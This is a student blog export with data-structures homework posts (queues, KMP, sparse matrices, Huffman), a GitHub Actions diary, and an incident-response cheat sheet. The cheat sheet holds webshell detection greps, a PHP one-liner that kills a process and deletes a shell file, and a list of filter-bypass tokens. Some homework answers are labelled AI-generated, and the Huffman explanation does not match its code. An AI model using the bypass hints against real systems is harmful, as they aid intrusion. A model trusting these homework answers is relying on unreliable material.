x;</span><br><span class="line">        Node&lt;DataType&gt;* p = first-&gt;next;</span><br><span class="line">        x = p-&gt;data;</span><br><span class="line">        first-&gt;next = p-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (rear == p)  <span class="comment">// 如果队列中只有一个元素</span></span><br><span class="line">            rear = first;  <span class="comment">// 则需要更新尾指针</span></span><br><span class="line">        <span class="keyword">delete</span> p;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkList_Queue&lt;<span class="type">int</span>&gt; s = &#123;&#125;;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    s.<span class="built_in">Push</span>(<span class="number">1</span>);</span><br><span class="line">    s.<span class="built_in">Push</span>(<span class="number">2</span>);</span><br><span class="line">    s.<span class="built_in">Push</span>(<span class="number">3</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;已入队1,2,3&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; a;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;已入队：&quot;</span> &lt;&lt; s.<span class="built_in">Push</span>(a) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;出队一次&quot;</span>&lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;已出队：&quot;</span> &lt;&lt; s.<span class="built_in">Pop</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;已出队：&quot;</span> &lt;&lt; s.<span class="built_in">Pop</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;已出队：&quot;</span> &lt;&lt; s.<span class="built_in">Pop</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;已出队：&quot;</span> &lt;&lt; s.<span class="built_in">Pop</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>AI生成的，不想做了，谨慎查阅</p>
</blockquote>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">// 定义结点</span><br><span class="line">typedef struct Node &#123;</span><br><span class="line">    int data;</span><br><span class="line">    struct Node* next;</span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line">// 定义队列</span><br><span class="line">typedef struct Queue &#123;</span><br><span class="line">    Node* rear;</span><br><span class="line">&#125; Queue;</span><br><span class="line"></span><br><span class="line">// 初始化队列</span><br><span class="line">Queue* initQueue() &#123;</span><br><span class="line">    Node* head = (Node*)malloc(sizeof(Node));  // 创建头结点</span><br><span class="line">    head-&gt;next = head;  // 循环链表</span><br><span class="line">    Queue* queue = (Queue*)malloc(sizeof(Queue));</span><br><span class="line">    queue-&gt;rear = head;  // 尾指针指向头结点</span><br><span class="line">    return queue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 入队操作</span><br><span class="line">void enQueue(Queue* queue, int data) &#123;</span><br><span class="line">    Node* newNode = (Node*)malloc(sizeof(Node));</span><br><span class="line">    newNode-&gt;data = data;</span><br><span class="line">    newNode-&gt;next = queue-&gt;rear-&gt;next;  // 新结点指向头结点</span><br><span class="line">    queue-&gt;rear-&gt;next = newNode;  // 尾结点指向新结点</span><br><span class="line">    queue-&gt;rear = newNode;  // 更新尾指针</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 出队操作</span><br><span class="line">int deQueue(Queue* queue) &#123;</span><br><span class="line">    if (queue-&gt;rear == queue-&gt;rear-&gt;next) &#123;</span><br><span class="line">        printf(&quot;队列为空，无法出队。\n&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    Node* head = queue-&gt;rear-&gt;next;  // 头结点</span><br><span class="line">    Node* firstNode = head-&gt;next;  // 第一个结点（即要出队的结点）</span><br><span class="line">    int data = firstNode-&gt;data;</span><br><span class="line">    head-&gt;next = firstNode-&gt;next;  // 头结点指向第二个结点</span><br><span class="line">    if (firstNode == queue-&gt;rear) &#123;  // 如果只有一个元素，出队后更新尾指针</span><br><span class="line">        queue-&gt;rear = head;</span><br><span class="line">    &#125;</span><br><span class="line">    free(firstNode);  // 释放出队的结点内存</span><br><span class="line">    return data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    Queue* queue = initQueue();</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    printf(&quot;入队：\n&quot;);</span><br><span class="line">    for (int i = 1; i &lt;= 5; i++) &#123;</span><br><span class="line">        printf(&quot;%d &quot;, i);</span><br><span class="line">        enQueue(queue, i);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    printf(&quot;\n出队：\n&quot;);</span><br><span class="line">    for (int i = 1; i &lt;= 5; i++) &#123;</span><br><span class="line">        printf(&quot;%d &quot;, deQueue(queue));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>学习笔记</category>
        <category>数据结构作业</category>
        <category>课后作业</category>
      </categories>
      <tags>
        <tag>数据结构作业</tag>
      </tags>
  </entry>
  <entry>
    <title>DS作业-5-22网安物联网-20231016</title>
    <url>/posts/9b8045c.html</url>
    <content><![CDATA[<p><strong>作业ch4-1：</strong></p>
<p>（1）</p>
<p>从主串S的第一个字符’a’开始，与模式串T的第一个字符’b’进行比较，发现不相等。</p>
<p>从主串S的第二个字符’b’开始，与模式串T进行比较，发现前三个字符’b’, ‘a’, ‘b’相等，但第四个字符’a’与模式串T的第四个字符’b’不相等。</p>
<p>从主串S的第三个字符’c’开始，与模式串T进行比较，发现第一个字符不相等。</p>
<p>以此类推，直到从主串S的第12个字符’b’开始，与模式串T进行比较，发现五个字符’b’, ‘a’, ‘b’, ‘a’, ‘b’全部相等，说明找到了一个匹配。</p>
<p>所以位置是12</p>
<p>（2）</p>
<table>
<thead>
<tr>
<th><strong>j</strong></th>
<th><strong>0</strong></th>
<th><strong>1</strong></th>
<th><strong>2</strong></th>
<th><strong>3</strong></th>
<th><strong>4</strong></th>
<th><strong>5</strong></th>
<th><strong>6</strong></th>
<th><strong>7</strong></th>
<th><strong>8</strong></th>
<th><strong>9</strong></th>
<th><strong>10</strong></th>
<th><strong>11</strong></th>
<th><strong>12</strong></th>
<th><strong>13</strong></th>
<th><strong>14</strong></th>
<th><strong>15</strong></th>
<th><strong>16</strong></th>
<th><strong>17</strong></th>
<th><strong>18</strong></th>
<th><strong>19</strong></th>
<th><strong>20</strong></th>
</tr>
</thead>
<tbody><tr>
<td>T[j]</td>
<td>a</td>
<td>b</td>
<td>c</td>
<td>a</td>
<td>a</td>
<td>b</td>
<td>b</td>
<td>c</td>
<td>a</td>
<td>a</td>
<td>a</td>
<td>b</td>
<td>a</td>
<td>b</td>
<td>a</td>
<td>b</td>
<td>a</td>
<td>a</td>
<td>b</td>
<td>c</td>
<td>a</td>
</tr>
<tr>
<td>next[j]</td>
<td>-1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>2</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>2</td>
<td>1</td>
<td>2</td>
<td>1</td>
<td>2</td>
<td>1</td>
<td>1</td>
<td>2</td>
<td>0</td>
</tr>
</tbody></table>
<p>（3）</p>
<p>S[0]与T[0]不匹配，移动模式串到S[1]。</p>
<p>S[1]与T[0]不匹配，移动模式串到S[2]。</p>
<p>以此类推，一直到S[4]和T[0]不匹配</p>
<p>移动模式串到S[1]</p>
<p>以此类推，当遇到不匹配时，回退到T[next[j]]的位置</p>
<p><strong>作业ch4-2：</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Status AddSMatrix(TSMatrix &amp;C, TSMatrix A, TSMatrix B) &#123;</span><br><span class="line">  C.mu = A.mu;</span><br><span class="line">  C.nu = A.nu;</span><br><span class="line">  int i = 0, m = 0, n = 0;</span><br><span class="line">  while (m &lt; A.tu &amp;&amp; n &lt; B.tu) &#123;</span><br><span class="line">    if (A.data[m].row &lt; B.data[n].row) &#123;</span><br><span class="line">      C.data[i] = A.data[m];</span><br><span class="line">      i++;</span><br><span class="line">      m++;</span><br><span class="line">    &#125; else if (A.data[m].row &gt; B.data[n].row) &#123;</span><br><span class="line">      C.data[i] = B.data[n];</span><br><span class="line">      i++;</span><br><span class="line">      n++;</span><br><span class="line">    &#125; else if (A.data[m].row == B.data[n].row) &#123;</span><br><span class="line">      if (A.data[m].col == B.data[n].col) &#123;</span><br><span class="line">        C.data[i].item = A.data[m].item + B.data[n].item;</span><br><span class="line">        C.data[i].row = A.data[m].row;</span><br><span class="line">        C.data[i].col = A.data[m].col;</span><br><span class="line">        m++;</span><br><span class="line">        n++;</span><br><span class="line">        i++;</span><br><span class="line">      &#125; else if (A.data[m].col &gt; B.data[n].col) &#123;</span><br><span class="line">        C.data[i] = B.data[n];</span><br><span class="line">        i++;</span><br><span class="line">        n++;</span><br><span class="line">      &#125; else if (A.data[m].col &lt; B.data[n].col) &#123;</span><br><span class="line">        C.data[i] = A.data[m];</span><br><span class="line">        i++;</span><br><span class="line">        m++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  C.tu = i + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>作业ch4-3：</strong></p>
<p>k&#x3D;(j-1)*(2n-j+2)&#x2F;2+(i-j)</p>
<p><strong>作业ch4-4：</strong></p>
<p>(1) A0000的地址为：100 + 2 × (0 × 3 × 5 × 8 + 0 × 5 × 8 + 0 × 8 + 0) &#x3D; 100</p>
<p>(2) A1111的地址为：100 + 2 × (1 × 3 × 5 × 8 + 1 × 5 × 8 + 1 × 8 + 1) &#x3D; 284</p>
<p>(3) A3125的地址为：100 + 2 × (3 × 3 × 5 × 8 + 1 × 5 × 8 + 2 × 8 + 5) &#x3D; 892</p>
<p>(4) A8247的地址为：100 + 2 × (8 × 3 × 5 × 8 + 2 × 5 × 8 + 4 × 8 +7) &#x3D; 2446</p>
<p><strong>作业ch4-5：</strong></p>
<p>在广义表中，GetHead操作返回广义表的第一个元素，而GetTail操作返回除第一个元素外的剩余部分。所以，对于给定的广义表，我们有：</p>
<p>(1) GetHead((p,h,w)) 的结果是 p。</p>
<p>(2) GetTail((p,h,w)) 的结果是 (h,w)。</p>
<p>(3) GetHead(((a,b),(c,d))) 的结果是 (a,b)。</p>
<p>(4) GetTail(((a,b),(c,d))) 的结果是 ((c,d))。</p>
<p>(5) GetHead(GetTail(((a,b),(c,d)))) 的结果是 (c,d)。</p>
<p>(6) GetTail(GetHead(GetTail(((a,b),(c,d))))) 的结果是 ()，因为(c,d)没有尾部。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>数据结构作业</category>
        <category>课后作业</category>
      </categories>
      <tags>
        <tag>数据结构作业</tag>
      </tags>
  </entry>
  <entry>
    <title>DS作业-7-Ch5-22网安物联网-20231113</title>
    <url>/posts/527dba8e.html</url>
    <content><![CDATA[<p>图片加载不出来请点开看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cyberdownload.anrunlu.net/FgJCJvVyhScTveE9fHtuBktOu4oB"
                      alt="img"
                ></p>
<h1 id="11题"><a href="#11题" class="headerlink" title="11题"></a>11题</h1><blockquote>
<p>假设用于通讯的电文由 8 个字母组成，ABCDEFGH ，字母在电文中 的出现频率分别为 0.07,0.19,0.02,0.06,0.32,0.03,0.21,0.10,试设计 Huffman 编码。</p>
</blockquote>
<blockquote>
<p>bing写的……</p>
</blockquote>
<p>以下是一个使用C++实现Huffman编码的代码，这个代码创建了一个Huffman树，并为每个字符生成了一个二进制编码。这个代码更加简洁，适合初学者理解：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ElemType</span> &#123;</span><br><span class="line">    <span class="type">int</span> weight;</span><br><span class="line">    <span class="type">int</span> parent, lchild, rchild;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HuffmanTree</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">HuffmanTree</span>(<span class="type">int</span> w[], <span class="type">int</span> n);</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    ElemType *huffTree;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Select</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> &amp;i1, <span class="type">int</span> &amp;i2)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HuffmanTree::Select</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> &amp;i1, <span class="type">int</span> &amp;i2)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, temp;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">if</span> (huffTree[i].parent == <span class="number">-1</span>) &#123;i1 = i; <span class="keyword">break</span>;&#125;</span><br><span class="line">    <span class="keyword">for</span> (i = i + <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">if</span> (huffTree[i].parent == <span class="number">-1</span>) &#123;i2 = i;<span class="keyword">break</span>;&#125;    </span><br><span class="line">    <span class="keyword">if</span> (huffTree[i1].weight &gt; huffTree[i2].weight) &#123;</span><br><span class="line">        temp = i1; i1 = i2;i2 = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = i + <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (huffTree[i].parent == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (huffTree[i].weight &lt; huffTree[i1].weight) &#123;</span><br><span class="line">                i2 = i1; i1 = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (huffTree[i].weight &lt; huffTree[i2].weight) &#123;</span><br><span class="line">                i2 = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HuffmanTree::<span class="built_in">HuffmanTree</span>(<span class="type">int</span> w[], <span class="type">int</span> n) &#123;</span><br><span class="line">    <span class="type">int</span> i, k, i1, i2;</span><br><span class="line">    huffTree = <span class="keyword">new</span> ElemType [<span class="number">2</span>*n<span class="number">-1</span>];</span><br><span class="line">    num = n;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>*num<span class="number">-1</span>; i++) &#123;</span><br><span class="line">        huffTree[i].parent = <span class="number">-1</span>;</span><br><span class="line">        huffTree[i].lchild = huffTree[i].rchild = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">        huffTree[i].weight = w[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (k = num; k &lt; <span class="number">2</span>*num<span class="number">-1</span>; k++) &#123;</span><br><span class="line">        <span class="built_in">Select</span>(k, i1, i2);</span><br><span class="line">        huffTree[k].weight = huffTree[i1].weight + huffTree[i2].weight;</span><br><span class="line">        huffTree[i1].parent = k; huffTree[i2].parent = k; </span><br><span class="line">        huffTree[k].lchild = i1; huffTree[k].rchild = i2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HuffmanTree::Print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i, k;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;每个叶子到根结点的路径是:&quot;</span> &lt;&lt; endl; </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">        cout &lt;&lt; huffTree[i].weight;</span><br><span class="line">        k = huffTree[i].parent;</span><br><span class="line">        <span class="keyword">while</span> (k != <span class="number">-1</span>) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;--&gt;&quot;</span> &lt;&lt; huffTree[k].weight;</span><br><span class="line">            k = huffTree[k].parent;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> w[] = &#123;<span class="number">7</span>, <span class="number">19</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">32</span>, <span class="number">3</span>, <span class="number">21</span>, <span class="number">10</span>&#125;;</span><br><span class="line">    <span class="function">HuffmanTree <span class="title">T</span><span class="params">(w, <span class="number">8</span>)</span></span>;</span><br><span class="line">    T.<span class="built_in">Print</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这段代码首先计算每个字符的频率，然后使用优先队列（最小堆）来创建Huffman树。然后，它遍历Huffman树以生成Huffman编码。最后，它打印出每个字符及其对应的Huffman编码。</p>
<p>请注意，这只是一个基本的实现，可能需要根据您的具体需求进行修改和优化。例如，您可能需要将字符频率作为输入参数，而不是在代码中硬编码。此外，这个代码没有进行错误处理，也没有释放动态分配的内存。在实际使用中，您需要确保代码的健壮性和效率。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>数据结构作业</category>
        <category>课后作业</category>
      </categories>
      <tags>
        <tag>数据结构作业</tag>
      </tags>
  </entry>
  <entry>
    <title>Github-actions学习的坎坷</title>
    <url>/posts/adaea106.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>事情是这样的，在昨天，也就是 2024 年 4 月 20 日，我突然发现了探姬师傅的<a class="link"   href="https://github.com/ProbiusOfficial/Hello-CTF/blob/main/.github/workflows/ghdeploy.yml" >Hello-CTF 中的工作流<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，虽然我看不懂，但是能大概猜出是什么意思，凑巧我又刷到了另一位大佬的项目，<a class="link"   href="https://github.com/aFlyBird0/blog-friends" >爱飞的鸟的博客的友链申请仓库<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，也是一个应用的 Github actions 工作流，于是我想我能不能也做一个工作流，实现我全自动化的博客部署和友链申请，再者，我手里还有个<a class="link"   href="https://github.com/W1ndys/Easy-QFNU" >Easy-QFNU<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>的项目，我也可以借鉴一下，毕竟我现在的刷新时间操作还是需要半人工操作的，虽然有很方便的脚本，但是我还想用工作流，实现全自动化，这样就不用人工来启动脚本了。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>说干就干，今天早上我起床吃饭之后就来实验室了，折腾了一下午，毫无进展，我一开始向 ChatGPT 求助，企图让他帮我直接写出脚本来，他的能力我还是挺认可的，但是结局不尽人意，我几乎一整天都在折腾这个 Github actions 工作流，从 12 点搞到晚上八点，没有任何进步。</p>
<p>已经不想说什么了，放几张图吧</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Github-actions/image.png"
                      alt="ChatGPT1"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Github-actions/image-1.png"
                      alt="ChatGPT2"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Github-actions/image-2.png"
                      alt="ChatGPT3"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Github-actions/image-3.png"
                      alt="ChatGPT4"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Github-actions/image-4.png"
                      alt="ChatGPT5"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Github-actions/image-5.png"
                      alt="ChatGPT6"
                ></p>
<p>这些差不多是十分之一的 ChatGPT 的输出，我已经不想再继续了，除此之外，我还问了 copilot，Gemini，Claude3。。。n 个 AI，都没有帮上忙，我只能自己摸索了。</p>
<h2 id="开始看文档"><a href="#开始看文档" class="headerlink" title="开始看文档"></a>开始看文档</h2><p>无奈之下我只好回归了本心，自己看文档自己动手</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Github-actions/image-6.png"
                      alt="Github-actions1"
                ></p>
<p>映入眼帘的英文啊，这对我一个四级都没过的人来说是莫大的痛苦，没办法，看呗</p>
<p>看了半天，大体看懂，但是不会写。</p>
<p>去搜一点别的，找到了<a class="link"   href="https://www.github-zh.com/getting-started/hello-github-actions#/" >ithub 中文社区<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，这里有一个 Github actions 的教程，看了一下，跟着来了一遍，成功了，测试要通过了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Github-actions/image-7.png"
                      alt="Github-actions2"
                ></p>
<blockquote>
<p>说到底，还得是实操，光有理论啥也不是，只有实践才能学会。</p>
</blockquote>
<p>目前的话是已经能正常输出语句了，但是中间的算法还没实现，只能等到下次有空再继续了</p>
<blockquote>
<p>哎，今天因为这个，浪费了大量时间，不过好在学到了一些东西，也不算白浪费。</p>
</blockquote>
]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>Github-actions</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker容器的学习</title>
    <url>/posts/dc51af4b.html</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>容器原理</tag>
      </tags>
  </entry>
  <entry>
    <title>HW</title>
    <url>/posts/8c7613a5.html</url>
    <content><![CDATA[<h1 id="HW"><a href="#HW" class="headerlink" title="HW"></a>HW</h1><h2 id="HW-1"><a href="#HW-1" class="headerlink" title="HW"></a>HW</h2><p>linux 系统</p>
<blockquote>
<p>首先查看一下基础信息</p>
<p>netstat -ano&#x2F;-a #查看端口情况</p>
<p>uname -a #系统信息</p>
<p>ps -aux ps -ef #进程信息</p>
<p>cat &#x2F;etc&#x2F;passwd #用户情况</p>
<p>ls &#x2F;home&#x2F; #用户情况</p>
</blockquote>
<p>查看日志文件</p>
<blockquote>
<p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F; #默认 Nginx 日志目录<br>&#x2F;var&#x2F;log&#x2F;apache&#x2F; #默认 Apache 日志目录<br>&#x2F;var&#x2F;log&#x2F;apache2&#x2F; #默认 Apache 日志目录<br>&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;logs #Tomcat 日志目录</p>
</blockquote>
<p><code>tail -f xxx.log</code> #实时刷新滚动日志文件</p>
<p>通过命令查看可疑文件</p>
<blockquote>
<p>find &#x2F;var&#x2F;www&#x2F;html -name <em>.php -mmin -20 #查看最近 20 分钟修改文件<br>find .&#x2F; -name ‘</em>.php’ | xargs wc -l | sort -u #寻找行数最短文件<br>grep -r –include&#x3D;<em>.php ‘[^a-z]eval($_POST’ &#x2F;var&#x2F;www&#x2F;html #查包含关键字的 php 文件<br>find &#x2F;var&#x2F;www&#x2F;html -type f -name “</em>.php” | xargs grep “eval(“ |more</p>
</blockquote>
<p>不死马查杀命令（只是临时解决方案，彻底解决请重启服务器）</p>
<p><code>&lt;?php system(&quot;kill -9 pid;rm -rf .shell.php&quot;); ?&gt; </code> #pid和不死马名称根据实际情况定</p>
<p>后门用户查杀：<br>UID 大于 500 的都是非系统账号，500 以下的都为系统保留的账号，使用 userdel -r username 完全删除账户</p>
<p>通过主机安全和态势感知发现告警，这类发现告警的话是可以定位到具体的时间的，根据发生时间来上级排查，定位该时间段内服务器上有做修改的文件，可以快速排查到是否存在 webshell 文件</p>
<p>windows 系统</p>
<ol>
<li><p>首先排查 windows 日志查看可疑时间段内的操作，查看 windows 日志方法（通过运行命令。按下“Win+R”键打开运行窗口，输入“eventvwr.msc”后按回车键），需要重点排查的内容是，在被攻击的时间段内的文件打开记录. 自启动运行记录. 软件运行记录，通过排查日志来清理入侵者上传的后门等文件<br>[图片]</p>
</li>
<li><p>排查目前的进程，按住 Ctrl+Shift+esc 可以打开任务管理器，需要观察的是占用网络比较大的进程，可以按照网络排序查看是否有占用流量比较大的的进程，右键可以定位到该文件在磁盘中的物理位置，查看可疑文件的创建时间来判断是否为攻击者上传的文件（这个时间也可以修改的，只能作为参考，并不代表创建时间较老就不是攻击者上传的文件）<br>[图片]</p>
</li>
<li><p>查看系统自启动项（通过运行命令。按下“Win+R”键打开运行窗口，输入“msconfig.exe”后按回车键）需要查看的是服务这里面是否有可疑的自启动项，这里面显示的是在开机的时候会自动运行的命令，如果被攻击的话可能在这里看到是否有攻击者为了维持权限添加的自启动项，从而定位到木马文件。<br>[图片]</p>
</li>
<li><p>查看系统用户是否存在影子用户，打开注册表查看 KEY_LOCAL_MACHINE&#x2F;SAM&#x2F;SAM&#x2F;Domains&#x2F;Account&#x2F;Users&#x2F;下是否存在陌生账户，及时删除。<br>影子账户：通过修改注册表内用的 abc<code>$值和已存在用户abc$</code>的相同的手段，可以实现 net user 命令看不到用户；用户管理窗口也看不到用户；只可以通过注册表查看到该用户，攻击者可以利用该账号直接登录到系统</p>
</li>
</ol>
<h2 id="安全设备"><a href="#安全设备" class="headerlink" title="安全设备"></a>安全设备</h2><p>雷池 waf <a class="link"   href="https://waf-ce.chaitin.cn/" >https://waf-ce.chaitin.cn/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>报警</p>
<p>绝大部分攻击流量都是 http，web 层面，看流量包研判</p>
<p>其他的应用绝大部分都是密码暴破 mysql，rdp，ssh，mssql，redis 等</p>
<p>常见协议的端口</p>
<h2 id="简单的-payload"><a href="#简单的-payload" class="headerlink" title="简单的 payload"></a>简单的 payload</h2><p>扫描器的 payload，sql 注入，xss，xxe，ssti，命令注入，代码注入，请求走私，反弹 shell，webshell 上传</p>
<h2 id="复杂的-payload"><a href="#复杂的-payload" class="headerlink" title="复杂的 payload"></a>复杂的 payload</h2><p>反序列化 payload，编码 payload，webshell 通信</p>
<p>常见的绕过，{IFS}，%00，<code>/\*\*/</code>，0x1212123213</p>
<h2 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h2><h3 id="网络层面"><a href="#网络层面" class="headerlink" title="网络层面"></a>网络层面</h3><p>安全设备的记录，态势感知，日志审计，定位源 ip</p>
<p>定位真实 ip：社工，攻击者工具漏洞，蜜罐</p>
<h3 id="主机层面"><a href="#主机层面" class="headerlink" title="主机层面"></a>主机层面</h3><h4 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h4><p>登录记录，突然多出来的用户，隐藏用户</p>
<h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><p>特权进程，隐藏进程，资源占用比较高的进程</p>
<h4 id="网络连接"><a href="#网络连接" class="headerlink" title="网络连接"></a>网络连接</h4><p>本机和其他机器建立的连接，dns 隧道</p>
<p>微步在线 IP 和域名是否是恶意的 <a class="link"   href="https://x.threatbook.com/" >https://x.threatbook.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h4 id="常见的持久化手段"><a href="#常见的持久化手段" class="headerlink" title="常见的持久化手段"></a>常见的持久化手段</h4><p>webshell，ssh 后门，icmp 隧道，dns 隧道等</p>
<h2 id="主要的-Web-漏洞"><a href="#主要的-Web-漏洞" class="headerlink" title="主要的 Web 漏洞"></a>主要的 Web 漏洞</h2><h3 id="Sql-注入"><a href="#Sql-注入" class="headerlink" title="Sql 注入"></a>Sql 注入</h3><p>原理：网站数据过滤不严格，过分信赖用户输入的数据, 没有过滤用户输入的恶意数据，无条件的把用户输入的数据当作 SQL 语句执行，因此导致 sql 注入漏洞产生</p>
<p>Sql 注入分类：</p>
<ol>
<li>以有无闭合字符分类：字符型. 整数型</li>
<li>以数据传输方式分类：post 类型. get 类型</li>
<li>注入方式细分：联合查询注入. 报错型注入. 布尔型盲注. 时间型盲注. 宽字节注入</li>
</ol>
<p>报错注入常用函数：<code>UpdateXML() </code>. <code>Floor()</code>. <code>Extractvalue()</code></p>
<p>mysql 默认存在的哪个数据库，注入时经常用到？</p>
<blockquote>
<p><code>Information_schema</code></p>
</blockquote>
